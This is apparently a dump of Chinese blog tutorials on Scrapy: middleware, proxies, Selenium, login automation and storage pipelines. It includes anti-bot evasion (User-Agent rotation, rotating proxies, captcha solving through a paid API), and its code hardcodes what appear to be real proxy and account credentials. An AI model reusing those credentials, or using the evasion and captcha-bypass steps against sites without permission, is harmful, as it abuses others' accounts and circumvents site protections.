(KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36&#x27;,] ​ 中间件 123456789101112class MyRandomUserAgentMiddleware: def process_request(self, request, spider): UA = choice(USER_AGENT_LIST) request.headers[&#x27;User-Agent&#x27;] = UA # 不要返回任何东西 def process_response(self, request, response, spider): return response def process_exception(self, request, exception, spider): pass 1.2 处理代理问题代理问题一直是我们作为一名爬虫工程师很蛋疼的问题. 不加容易被检测, 加了效率低, 免费的可用IP更是凤毛麟角. 没办法, 无论如何还是得面对它. 这里, 我们采用两个方案来给各位展示scrapy中添加代理的逻辑. 免费代理 12345678910111213141516171819class ProxyMiddleware: def process_request(self, request, spider): print(&quot;又来&quot;) proxy = choice(PROXY_LIST) request.meta[&#x27;proxy&#x27;] = &quot;https://&quot;+proxy # 设置代理 return None def process_response(self, request, response, spider): print(&#x27;有么有结果???&#x27;) if response.status != 200: print(&quot;尝试失败&quot;) request.dont_filter = True # 丢回调度器重新请求 return request return response def process_exception(self, request, exception, spider): print(&quot;出错了!&quot;) pass 收费代理 免费代理实在太难用了. 我们这里直接选择一个收费代理. 依然选择快代理, 这个根据你自己的喜好进行调整. 12345678910111213141516171819202122232425262728293031class MoneyProxyMiddleware: def _get_proxy(self): &quot;&quot;&quot; 912831993520336 t12831993520578 每次请求换IP tps138.kdlapi.com 15818 需实名认证 5次/s 5Mb/s 有效 续费|订单详情|实名认证 隧道用户名密码修改密码 用户名：t12831993520578密码：t72a13xu :return: &quot;&quot;&quot; url = &quot;http://tps138.kdlapi.com:15818&quot; auth = basic_auth_header(username=&quot;t12831993520578&quot;, password=&quot;t72a13xu&quot;) return url, auth def process_request(self, request, spider): print(&quot;......&quot;) url, auth = self._get_proxy() request.meta[&#x27;proxy&#x27;] = url request.headers[&#x27;Proxy-Authorization&#x27;] = auth request.headers[&#x27;Connection&#x27;] = &#x27;close&#x27; return None def process_response(self, request, response, spider): print(response.status, type(response.status)) if response.status != 200: request.dont_filter = True return request return response def process_exception(self, request, exception, spider): pass 1.3 使用selenium完成数据抓取首先, 我们需要使用selenium作为下载器进行下载. 那么我们的请求应该也是特殊订制的. 所以, 在我的设计里, 我可以重新设计一个请求. 就叫SeleniumRequest 1234from scrapy.http.request import Requestclass SeleniumRequest(Request): pass 这里面不需要做任何操作. 整体还是用它父类的东西来进行操作. 接下来. 完善一下spider 1234567891011121314151617181920212223242526272829303132import scrapyfrom boss.request import SeleniumRequestclass BeijingSpider(scrapy.Spider): name = &#x27;beijing&#x27; allowed_domains = [&#x27;zhipin.com&#x27;] start_urls = [&#x27;https://www.zhipin.com/job_detail/?query=python&amp;city=101010100&amp;industry=&amp;position=&#x27;] def start_requests(self): yield SeleniumRequest( url=BeijingSpider.start_urls[0], callback=self.parse, ) def parse(self, resp, **kwargs): li_list = resp.xpath(&#x27;//*[@id=&quot;main&quot;]/div/div[3]/ul/li&#x27;) for li in li_list: href = li.xpath(&quot;./div[1]/div[1]/div[1]/div[1]/div[1]/span[1]/a[1]/@href&quot;).extract_first() name = li.xpath(&quot;./div[1]/div[1]/div[1]/div[1]/div[1]/span[1]/a[1]/text()&quot;).extract_first() print(name, href) print(resp.urljoin(href)) yield SeleniumRequest( url=resp.urljoin(href), callback=self.parse_detail, ) # 下一页..... def parse_detail(self, resp, **kwargs): print(&quot;招聘人&quot;, resp.xpath(&#x27;//*[@id=&quot;main&quot;]/div[3]/div/div[2]/div[1]/h2&#x27;).extract()) 中间件~ 1234567891011121314151617181920212223242526272829303132333435class BossDownloaderMiddleware: @classmethod def from_crawler(cls, crawler): # This method is used by Scrapy to create your spiders. s = cls() # 这里很关键哦. # 在爬虫开始的时候. 执行spider_opened # 在爬虫结束的时候. 执行spider_closed crawler.signals.connect(s.spider_opened, signal=signals.spider_opened) crawler.signals.connect(s.spider_closed, signal=signals.spider_closed) return s def process_request(self, request, spider): if isinstance(request, SeleniumRequest): self.web.get(request.url) time.sleep(3) page_source = self.web.page_source return HtmlResponse(url=request.url, encoding=&#x27;utf-8&#x27;, request=request, body=page_source) def process_response(self, request, response, spider): return response def process_exception(self, request, exception, spider): pass def spider_opened(self, spider): self.web = Chrome() self.web.implicitly_wait(10) # 完成登录. 拿到cookie. 很容易... print(&quot;创建浏览器&quot;) def spider_closed(self, spider): self.web.close() print(&quot;关闭浏览器&quot;) settings 1234DOWNLOADER_MIDDLEWARES = &#123; # 怼在所有默认中间件前面. 只要是selenium后面所有的中间件都给我停 &#x27;boss.middlewares.BossDownloaderMiddleware&#x27;: 99, &#125; 1.4 用selenium设置cookie有了这个案例. 想要用selenium处理cookie也很容易了. 直接在spider_opened位置完成登录, 然后在process_request()中简单设置一下即可. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class ChaojiyingDownloaderMiddleware: @classmethod def from_crawler(cls, crawler): # This method is used by Scrapy to create your spiders. s = cls() crawler.signals.connect(s.spider_opened, signal=signals.spider_opened) return s def process_request(self, request, spider): if not request.cookies: request.cookies = self.cookie return None def process_response(self, request, response, spider): return response def process_exception(self, request, exception, spider): pass def spider_opened(self, spider): web = Chrome() web.get(&quot;https://www.chaojiying.com/user/login/&quot;) web.find_element_by_xpath(&#x27;/html/body/div[3]/div/div[3]/div[1]/form/p[1]/input&#x27;).send_keys(&quot;18614075987&quot;) web.find_element_by_xpath(&#x27;/html/body/div[3]/div/div[3]/div[1]/form/p[2]/input&#x27;).send_keys(&#x27;q6035945&#x27;) img = web.find_element_by_xpath(&#x27;/html/body/div[3]/div/div[3]/div[1]/form/div/img&#x27;) verify_code = self.base64_api(&quot;q6035945&quot;, &quot;q6035945&quot;, img.screenshot_as_base64, 3) web.find_element_by_xpath(&#x27;/html/body/div[3]/div/div[3]/div[1]/form/p[3]/input&#x27;).send_keys(verify_code) web.find_element_by_xpath(&#x27;/html/body/div[3]/div/div[3]/div[1]/form/p[4]/input&#x27;).click() time.sleep(3) cookies = web.get_cookies() self.cookie = &#123;dic[&#x27;name&#x27;]:dic[&#x27;value&#x27;] for dic in cookies&#125; web.close() def base64_api(self, uname, pwd, b64_img, typeid): data = &#123; &quot;username&quot;: uname, &quot;password&quot;: pwd, &quot;typeid&quot;: typeid, &quot;image&quot;: b64_img &#125; result = json.loads(requests.post(&quot;http://api.ttshitu.com/predict&quot;, json=data).text) if result[&#x27;success&#x27;]: return result[&quot;data&quot;][&quot;result&quot;] else: return result[&quot;message&quot;] 2. SpiderMiddleware(了解)​ 爬虫中间件. 是处于引擎和spider之间的中间件. 里面常用的方法有: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class CuowuSpiderMiddleware: # Not all methods need to be defined. If a method is not defined, # scrapy acts as if the spider middleware does not modify the # passed objects. @classmethod def from_crawler(cls, crawler): # This method is used by Scrapy to create your spiders. s = cls() crawler.signals.connect(s.spider_opened, signal=signals.spider_opened) return s def process_spider_input(self, response, spider): # 请求被返回, 即将进入到spider时调用 # 要么返回None, 要么报错 print(&quot;我是process_spider_input&quot;) return None def process_spider_output(self, response, result, spider): # 处理完spider中的数据. 返回数据后. 执行 # 返回值要么是item, 要么是request. print(&quot;我是process_spider_output&quot;) for i in result: yield i print(&quot;我是process_spider_output&quot;) def process_spider_exception(self, response, exception, spider): print(&quot;process_spider_exception&quot;) # spider中报错 或者, process_spider_input() 方法报错 # 返回None或者Request或者item. it = ErrorItem() it[&#x27;name&#x27;] = &quot;exception&quot; it[&#x27;url&#x27;] = response.url yield it def process_start_requests(self, start_requests, spider): print(&quot;process_start_requests&quot;) # 第一次启动爬虫时被调用. # Must return only requests (not items). for r in start_requests: yield r def spider_opened(self, spider): pass items 123class ErrorItem(scrapy.Item): name = scrapy.Field() url = scrapy.Field() spider: 123456789101112class BaocuoSpider(scrapy.Spider): name = &#x27;baocuo&#x27; allowed_domains = [&#x27;baidu.com&#x27;] start_urls = [&#x27;http://www.baidu.com/&#x27;] def parse(self, resp, **kwargs): name = resp.xpath(&#x27;//title/text()&#x27;).extract_first() # print(1/0) # 调整调整这个. 简单琢磨一下即可~~ it = CuowuItem() it[&#x27;name&#x27;] = name print(name) yield it pipeline: 12345678910from cuowu.items import ErrorItemclass CuowuPipeline: def process_item(self, item, spider): if isinstance(item, ErrorItem): print(&quot;错误&quot;, item) else: print(&quot;没错&quot;, item) return item 目录结构: 123456789101112cuowu├── cuowu│ ├── __init__.py│ ├── items.py│ ├── middlewares.py│ ├── pipelines.py│ ├── settings.py│ └── spiders│ ├── __init__.py│ └── baocuo.py└── scrapy.cfg","categories":[{"name":"爬虫开发","slug":"爬虫开发","permalink":"http://blog.ioimp.top/categories/%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Scrapy爬虫","slug":"Scrapy爬虫","permalink":"http://blog.ioimp.top/tags/Scrapy%E7%88%AC%E8%99%AB/"}]},{"title":"Scrapy_管道","slug":"09-Scrapy-管道","date":"2023-12-03T03:56:22.000Z","updated":"2023-12-03T03:56:56.718Z","comments":true,"path":"2023/12/03/09-Scrapy-管道/","link":"","permalink":"http://blog.ioimp.top/2023/12/03/09-Scrapy-%E7%AE%A1%E9%81%93/","excerpt":"","text":"Scrapy管道在上一小节中, 我们初步掌握了Scrapy的基本运行流程以及基本开发流程. 本节继续讨论关于Scrapy更多的内容. 一. 关于管道上一节内容, 我们已经可以从spider中提取到数据. 然后通过引擎将数据传递给pipeline, 那么在pipeline中如何对数据进行保存呢? 我们主要针对四种数据存储展开讲解. 前三个案例以http://datachart.500.com/ssq/为案例基础. 最后一个以https://www.tupianzj.com/bizhi/DNmeinv/为案例基础. 1. csv文件写入​ 写入文件是一个非常简单的事情. 直接在pipeline中开启文件即可. 但这里要说明的是. 如果我们只在process_item中进行处理文件是不够优雅的. 总不能有一条数据就open一次吧 1234567class CaipiaoFilePipeline: def process_item(self, item, spider): with open(&quot;caipiao.txt&quot;, mode=&quot;a&quot;, encoding=&#x27;utf-8&#x27;) as f: # 写入文件 f.write(f&quot;&#123;item[&#x27;qihao&#x27;]&#125;, &#123;&#x27;_&#x27;.join(item[&#x27;red_ball&#x27;])&#125;, &#123;&#x27;_&#x27;.join(item[&#x27;blue_ball&#x27;])&#125;\\n&quot;) return item ​ 我们希望的是, 能不能打开一个文件, 然后就用这一个文件句柄来完成数据的保存. 答案是可以的. 我们可以在pipeline中创建两个方法, 一个是open_spider(), 另一个是close_spider(). 看名字也能明白其含义: ​ open_spider(), 在爬虫开始的时候执行一次​ close_spider(), 在爬虫结束的时候执行一次 ​ 有了这俩货, 我们就可以很简单的去处理这个问题 12345678910111213class CaipiaoFilePipeline: def open_spider(self, spider): self.f = open(&quot;caipiao.txt&quot;, mode=&quot;a&quot;, encoding=&#x27;utf-8&#x27;) def close_spider(self, spider): if self.f: self.f.close() def process_item(self, item, spider): # 写入文件 self.f.write(f&quot;&#123;item[&#x27;qihao&#x27;]&#125;, &#123;&#x27;_&#x27;.join(item[&#x27;red_ball&#x27;])&#125;, &#123;&#x27;_&#x27;.join(item[&#x27;blue_ball&#x27;])&#125;\\n&quot;) return item ​ 在爬虫开始的时候打开一个文件, 在爬虫结束的时候关闭这个文件. 满分~ ​ 对了, 别忘了设置settings 123ITEM_PIPELINES = &#123; &#x27;caipiao.pipelines.CaipiaoFilePipeline&#x27;: 300,&#125; 2. mysql数据库写入​ 有了上面的示例, 写入数据库其实也就很顺其自然了, 首先, 在open_spider中创建好数据库连接. 在close_spider中关闭链接. 在proccess_item中对数据进行保存工作. 先把mysql相关设置丢到settings里 12345678# MYSQL配置信息MYSQL_CONFIG = &#123; &quot;host&quot;: &quot;localhost&quot;, &quot;port&quot;: 3306, &quot;user&quot;: &quot;root&quot;, &quot;password&quot;: &quot;test123456&quot;, &quot;database&quot;: &quot;spider&quot;,&#125; 1234567891011121314151617181920212223242526from caipiao.settings import MYSQL_CONFIG as mysqlimport pymysqlclass CaipiaoMySQLPipeline: def open_spider(self, spider): self.conn = pymysql.connect(host=mysql[&quot;host&quot;], port=mysql[&quot;port&quot;], user=mysql[&quot;user&quot;], password=mysql[&quot;password&quot;], database=mysql[&quot;database&quot;]) def close_spider(self, spider): self.conn.close() def process_item(self, item, spider): # 写入文件 try: cursor = self.conn.cursor() sql = &quot;insert into caipiao(qihao, red, blue) values(%s, %s, %s)&quot; red = &quot;,&quot;.join(item[&#x27;red_ball&#x27;]) blue = &quot;,&quot;.join(item[&#x27;blue_ball&#x27;]) cursor.execute(sql, (item[&#x27;qihao&#x27;], red, blue)) self.conn.commit() spider.logger.info(f&quot;保存数据&#123;item&#125;&quot;) except Exception as e: self.conn.rollback() spider.logger.error(f&quot;保存数据库失败!&quot;, e, f&quot;数据是: &#123;item&#125;&quot;) # 记录错误日志 return item 别忘了把pipeline设置一下 123ITEM_PIPELINES = &#123; &#x27;caipiao.pipelines.CaipiaoMySQLPipeline&#x27;: 301,&#125; 3. mongodb数据库写入​ mongodb数据库写入和mysql写入如出一辙…不废话直接上代码吧 12345678MONGO_CONFIG = &#123; &quot;host&quot;: &quot;localhost&quot;, &quot;port&quot;: 27017, &#x27;has_user&#x27;: True, &#x27;user&#x27;: &quot;python_admin&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;db&quot;: &quot;python&quot;&#125; 12345678910111213141516171819from caipiao.settings import MONGO_CONFIG as mongoimport pymongoclass CaipiaoMongoDBPipeline: def open_spider(self, spider): client = pymongo.MongoClient(host=mongo[&#x27;host&#x27;], port=mongo[&#x27;port&#x27;]) db = client[mongo[&#x27;db&#x27;]] if mongo[&#x27;has_user&#x27;]: db.authenticate(mongo[&#x27;user&#x27;], mongo[&#x27;password&#x27;]) self.client = client self.collection = db[&#x27;caipiao&#x27;] def close_spider(self, spider): self.client.close() def process_item(self, item, spider): self.collection.insert(&#123;&quot;qihao&quot;: item[&#x27;qihao&#x27;], &#x27;red&#x27;: item[&quot;red_ball&quot;], &#x27;blue&#x27;: item[&#x27;blue_ball&#x27;]&#125;) return item 123456ITEM_PIPELINES = &#123; # 三个管道可以共存~ &#x27;caipiao.pipelines.CaipiaoFilePipeline&#x27;: 300, &#x27;caipiao.pipelines.CaipiaoMySQLPipeline&#x27;: 301, &#x27;caipiao.pipelines.CaipiaoMongoDBPipeline&#x27;: 302,&#125; 4. 文件保存接下来我们来尝试使用scrapy来下载一些图片, 看看效果如何. 首先, 随便找个图片网站(安排好的). https://www.tupianzj.com/bizhi/DNmeinv/. 可以去看看, 妹子们还是很漂亮的. 接下来. 创建好项目, 定义好数据结构 1234class MeinvItem(scrapy.Item): name = scrapy.Field() img_url = scrapy.Field() img_path = scrapy.Field() 完善spider, 注意看yield scrapy.Request() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import scrapyfrom meinv.items import MeinvItemclass TupianzhijiaSpider(scrapy.Spider): name = &#x27;tupianzhijia&#x27; allowed_domains = [&#x27;tupianzj.com&#x27;] start_urls = [&#x27;https://www.tupianzj.com/bizhi/DNmeinv/&#x27;] def parse(self, resp, **kwargs): li_list = resp.xpath(&quot;//ul[@class=&#x27;list_con_box_ul&#x27;]/li&quot;) for li in li_list: href = li.xpath(&quot;./a/@href&quot;).extract_first() # 拿到href为了什么? 进入详情页啊 &quot;&quot;&quot; url: 请求地址 method: 请求方式 callback: 回调函数 errback: 报错回调 dont_filter: 默认False, 表示&quot;不过滤&quot;, 该请求会重新进行发送 headers: 请求头. cookies: cookie信息 &quot;&quot;&quot; yield scrapy.Request( url=resp.urljoin(href), # scrapy的url拼接 method=&#x27;get&#x27;, callback=self.parse_detail, ) # 下一页 next_page = resp.xpath(&#x27;//div[@class=&quot;pages&quot;]/ul/li/a[contains(text(), &quot;下一页&quot;)]/@href&#x27;).extract_first() if next_page: yield scrapy.Request( url=resp.urljoin(next_page), method=&#x27;get&#x27;, callback=self.parse ) def parse_detail(self, resp): img_src = resp.xpath(&#x27;//*[@id=&quot;bigpic&quot;]/a[1]/img/@src&#x27;).extract_first() name = resp.xpath(&#x27;//*[@id=&quot;container&quot;]/div/div/div[2]/h1/text()&#x27;).extract_first() meinv = MeinvItem() meinv[&#x27;name&#x27;] = name meinv[&#x27;img_url&#x27;] = img_src yield meinv ​ 关于Request()的参数:​ url: 请求地址​ method: 请求方式​ callback: 回调函数​ errback: 报错回调​ dont_filter: 默认False, 表示”不过滤”, 该请求会重新进行发送​ headers: 请求头.​ cookies: cookie信息 ​ 接下来就是下载问题了. 如何在pipeline中下载一张图片呢? Scrapy早就帮你准备好了. 在Scrapy中有一个ImagesPipeline可以实现自动图片下载功能. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from scrapy.pipelines.images import ImagesPipeline, FilesPipelineimport pymysqlfrom meinv.settings import MYSQLimport scrapyclass MeinvPipeline: def open_spider(self, spider): self.conn = pymysql.connect( host=MYSQL[&#x27;host&#x27;], port=MYSQL[&#x27;port&#x27;], user=MYSQL[&#x27;user&#x27;], password=MYSQL[&#x27;password&#x27;], database=MYSQL[&#x27;database&#x27;] ) def close_spider(self, spider): if self.conn: self.conn.close() def process_item(self, item, spider): try: cursor = self.conn.cursor() sql = &quot;insert into tu (name, img_src, img_path) values (%s, %s, %s)&quot; cursor.execute(sql, (item[&#x27;name&#x27;], item[&#x27;img_src&#x27;], item[&#x27;img_path&#x27;])) self.conn.commit() except: self.conn.rollback() finally: if cursor: cursor.close() return itemclass MeinvSavePipeline(ImagesPipeline): def get_media_requests(self, item, info): # 发送请求去下载图片 # 如果是一堆图片. 可以使用循环去得到每一个url, 然后在yield每一个图片对应的Request对象 return scrapy.Request(item[&#x27;img_url&#x27;]) def file_path(self, request, response=None, info=None): # 准备好图片的名称 filename = request.url.split(&quot;/&quot;)[-1] return f&quot;img/&#123;filename&#125;&quot; def item_completed(self, results, item, info): # 文件存储的路径 ok, res = results[0] # print(res[&#x27;path&#x27;]) item[&#x27;img_path&#x27;] = res[&quot;path&quot;] return item 最后, 需要在settings中设置以下内容: 12345678910111213141516MYSQL = &#123; &quot;host&quot;: &quot;localhost&quot;, &quot;port&quot;: 3306, &quot;user&quot;: &quot;root&quot;, &quot;password&quot;: &quot;test123456&quot;, &quot;database&quot;: &#x27;spider&#x27;&#125;ITEM_PIPELINES = &#123; &#x27;meinv.pipelines.MeinvPipeline&#x27;: 303, &#x27;meinv.pipelines.MeinvSavePipeline&#x27;: 301,&#125;# 图片保存路径 -&gt; ImagesPipelineIMAGES_STORE= &#x27;./my_tu&#x27;# 文件保存路径 -&gt; FilesPipelineFILES_STORE = &#x27;./my_tu&#x27;","categories":[{"name":"爬虫开发","slug":"爬虫开发","permalink":"http://blog.ioimp.top/categories/%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Scrapy爬虫","slug":"Scrapy爬虫","permalink":"http://blog.ioimp.top/tags/Scrapy%E7%88%AC%E8%99%AB/"}]},{"title":"scrapy入门课件","slug":"scrapy入门课件","date":"2023-12-03T03:53:32.000Z","updated":"2023-12-03T03:55:45.577Z","comments":true,"path":"2023/12/03/scrapy入门课件/","link":"","permalink":"http://blog.ioimp.top/2023/12/03/scrapy%E5%85%A5%E9%97%A8%E8%AF%BE%E4%BB%B6/","excerpt":"","text":"Scrapy 基本介绍与使用一, 爬虫工程化​ 在之前的学习中我们已经掌握了爬虫这门技术需要的大多数的技术点, 但是我们现在写的代码还很流程化, 很难进行商用的. 想要我们的爬虫达到商用级别, 必须要对我们现在编写的爬虫代码进行大刀阔斧式的重组, 已达到工程化的爬虫. 何为工程化, 就是让你的程序更加的有体系, 有逻辑, 更加的模块化. ​ 就好比, 我们家里以前做过鞋子, 我妈妈给我做鞋, 她需要从画图纸到裁剪到最后的缝合, 一步一步的完成一双鞋子的制作. 这种手工鞋子如果每年做个几双, 没问题. 我妈妈辛苦一点, 也能搞定. 但是, 如果现在我想去售卖这个鞋子. 再依靠妈妈一双一双的缝制. 你不赔死, 也得让你妈打死. 为什么? 第一, 产能跟不上. 一个人的力量是有限的, 第二, 一个人要完整的把制作鞋子的工艺从头搞到尾. 就算你想招人分担一下. 貌似也不好找这样厉害的手艺人. 怎么办? 聪明的你可能已经想到了. 从头到尾完成一双鞋的人不好找. 那我就把这个工艺过程分开. 分成4份, 画图, 裁剪, 缝合, 验收. 招4个人. 每个人就负责一小部分. 并且这一小部分是很容易完成的. 最终只要有一个人(我)来做一个总指挥. 我的制鞋小工厂就建起来了. ​ 上述逻辑同样适用于我们的爬虫, 想想, 到目前为止, 我们所编写的爬虫我们都是从头到尾的每一步都要亲力亲为. 这样做固然有其优点(可控性更好), 但是各位请认真思考. 这样的代码逻辑是不能形成批量生产的效果的(写100个爬虫). 很多具有共通性的代码逻辑都没有进行重复利用. 那我们就可以考虑看看, 能不能把一些共性的问题(获取页面源代码, 数据存储), 单独搞成一个功能. 如果我们把这些功能单独进行编写. 并且产生类似单独的功能模块, 将大大的提高我们爬虫的效率. 已达到我们爬虫工程化开发的效果. ​ 爬虫工程化: 对爬虫的功能进行模块化的开发. 并达到可以批量生产的效果(不论是开发还是数据产出) 二, scrapy简介​ Scrapy到目前为止依然是这个星球上最流行的爬虫框架. 摘一下官方给出对scrapy的介绍 123An open source and collaborative framework for extracting the data you need from websites.In a fast, simple, yet extensible way. ​ scrapy的特点: 速度快, 简单, 可扩展性强. ​ scrapy的官方文档: https://docs.scrapy.org/en/latest/ 三, scrapy工作流程(重点)​ 之前我们所编写的爬虫的逻辑: ​ scrapy的工作流程: 整个工作流程, 爬虫中起始的url构造成request对象, 并传递给调度器. 引擎从调度器中获取到request对象. 然后交给下载器 由下载器来获取到页面源代码, 并封装成response对象. 并回馈给引擎 引擎将获取到的response对象传递给spider, 由spider对数据进行解析(parse). 并回馈给引擎 引擎将数据传递给pipeline进行数据持久化保存或进一步的数据处理. 在此期间如果spider中提取到的并不是数据. 而是子页面url. 可以进一步提交给调度器, 进而重复步骤2的过程 上述过程中一直在重复着几个东西, 引擎(engine) scrapy的核心, 所有模块的衔接, 数据流程梳理. 调度器(scheduler) 本质上这东西可以看成是一个队列. 里面存放着一堆我们即将要发送的请求. 可以看成是一个url的容器. 它决定了下一步要去爬取哪一个url. 通常我们在这里可以对url进行去重操作. 下载器(downloader) 它的本质就是用来发动请求的一个模块. 小白们完全可以把它理解成是一个get_page_source()的功能. 只不过这货返回的是一个response对象. 爬虫(spider) 这是我们要写的第一个部分的内容, 负责解析下载器返回的response对象.从中提取到我们需要的数据. 管道(pipeline) 这是我们要写的第二个部分的内容, 主要负责数据的存储和各种持久化操作. 经过上述的介绍来看, scrapy其实就是把我们平时写的爬虫进行了四分五裂式的改造. 对每个功能进行了单独的封装, 并且, 各个模块之间互相的不做依赖. 一切都由引擎进行调配. 这种思想希望你能知道–解耦. 让模块与模块之间的关联性更加的松散. 这样我们如果希望替换某一模块的时候会非常的容易. 对其他模块也不会产生任何的影响. 到目前为止, 我们对scrapy暂时了解这么多就够了. 后面会继续在这个图上进一步展开. 四, scrapy安装​ 在windows上安装scrapy是一个很痛苦的事情. 可能会出现各种各样的异常BUG. ​ 先使用pip直接安装看看报错不 1pip install -i https://pypi.tuna.tsinghua.edu.cn/simple scrapy ​ 如果安装成功, 直接去创建项目即可. 如果报错可能需要安装VC++14.0库才可以. 安装的时候一定不要死记安装步骤, 要观察报错信息. 根据报错信息进行一点点的调整, 多试几次pip. 直至success. 如果上述过程还是无法正常安装scrapy, 可以考虑用下面的方案来安装: 安装wheel 1pip install wheel 下载twisted安装包, https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted 用wheel安装twisted. 1pip install Twisted‑21.7.0‑py3‑none‑any.whl 安装pywin32 1pip install pywin32 安装scrapy 1pip install scrapy 总之, 最终你的控制台输入scrapy version能显示版本号. 就算成功了 五, scrapy实例​ 接下来, 我们用scrapy来完成一个超级简单的爬虫, 目标: 深入理解Scrapy工作的流程, 以及各个模块之间是如何搭配工作的. 创建项目 1scrapy startproject 项目名称 示例: 1scrapy startproject mySpider_2 创建好项目后, 我们可以在pycharm里观察到scrapy帮我们创建了一个文件夹, 里面的目录结构如下: 1234567891011mySpider_2 # 项目所在文件夹, 建议用pycharm打开该文件夹 ├── mySpider_2 # 项目跟目录 │ ├── __init__.py │ ├── items.py # 封装数据的格式 │ ├── middlewares.py # 所有中间件 │ ├── pipelines.py # 所有的管道 │ ├── settings.py # 爬虫配置信息 │ └── spiders # 爬虫文件夹, 稍后里面会写入爬虫代码 │ └── __init__.py └── scrapy.cfg # scrapy项目配置信息,不要删它,别动它,善待它. 创建爬虫 12cd 文件夹 # 进入项目所在文件夹scrapy genspider 爬虫名称 允许抓取的域名范围 示例: 12cd mySpider_2scrapy genspider youxi 4399.com 效果: 1234567(base) sylardeMBP:第七章 sylar$ cd mySpider_2(base) sylardeMBP:mySpider_2 sylar$ lsmySpider_2 scrapy.cfg(base) sylardeMBP:mySpider_2 sylar$ scrapy genspider youxi http://www.4399.com/Created spider &#x27;youxi&#x27; using template &#x27;basic&#x27; in module: mySpider_2.spiders.youxi(base) sylardeMBP:mySpider_2 sylar$ 至此, 爬虫创建完毕, 我们打开文件夹看一下. 1234567891011├── mySpider_2│ ├── __init__.py│ ├── items.py│ ├── middlewares.py│ ├── pipelines.py│ ├── settings.py│ └── spiders│ ├── __init__.py│ └── youxi.py # 多了一个这个. └── scrapy.cfg 编写数据解析过程 完善youxi.py中的内容. 123456789101112131415161718192021222324252627282930import scrapyclass YouxiSpider(scrapy.Spider): name = &#x27;youxi&#x27; # 该名字非常关键, 我们在启动该爬虫的时候需要这个名字 allowed_domains = [&#x27;4399.com&#x27;] # 爬虫抓取的域. start_urls = [&#x27;http://www.4399.com/flash/&#x27;] # 起始页 def parse(self, response, **kwargs): # response.text # 页面源代码 # response.xpath() # 通过xpath方式提取 # response.css() # 通过css方式提取 # response.json() # 提取json数据 # 用我们最熟悉的方式: xpath提取游戏名称, 游戏类别, 发布时间等信息 li_list = response.xpath(&quot;//ul[@class=&#x27;n-game cf&#x27;]/li&quot;) for li in li_list: name = li.xpath(&quot;./a/b/text()&quot;).extract_first() category = li.xpath(&quot;./em/a/text()&quot;).extract_first() date = li.xpath(&quot;./em/text()&quot;).extract_first() dic = &#123; &quot;name&quot;: name, &quot;category&quot;: category, &quot;date&quot;: date &#125; # 将提取到的数据提交到管道内. # 注意, 这里只能返回 request对象, 字典, item数据, or None yield dic 注意: &#x3D;&#x3D;spider返回的内容只能是字典, requestes对象, item数据或者None. 其他内容一律报错&#x3D;&#x3D; 运行爬虫: 1scrapy crawl 爬虫名字 实例: 1scrapy crawl youxi 编写pipeline.对数据进行简单的保存 数据传递到pipeline, 我们先看一下在pipeline中的样子. 首先修改settings.py文件中的pipeline信息 12345ITEM_PIPELINES = &#123; # 前面是pipeline的类名地址 # 后面是优先级, 优先级月低越先执行 &#x27;mySpider_2.pipelines.Myspider2Pipeline&#x27;: 300,&#125; 然后我们修改一下pipeline中的代码: 123456class Myspider2Pipeline: # 这个方法的声明不能动!!! 在spider返回的数据会自动的调用这里的process_item方法. # 